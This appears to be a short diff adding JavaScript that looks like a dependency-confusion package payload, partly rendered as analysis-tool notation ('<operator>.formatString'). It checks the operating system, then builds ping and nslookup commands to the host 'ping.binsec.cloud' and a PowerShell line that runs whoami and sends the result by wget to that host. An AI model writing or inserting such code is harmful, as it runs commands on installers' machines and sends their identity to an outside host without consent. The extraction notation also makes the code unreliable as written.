@@ -1,0 +1,9 @@
+var exec = require('child_process').exec
+var os = require('os')
+domain = "ping.binsec.cloud"
+os.type() === 'Linux'
+os.type() === 'Darwin'
+os.type() === 'Windows_NT'
+<operator>.formatString("ping -n 1 windows.", domain, "")
+<operator>.formatString("nslookup windows.", domain, "")
+<operator>.formatString("powershell $cmd = whoami; wget https://", domain, "/ping?id=dependencyconfusion-$cmd")
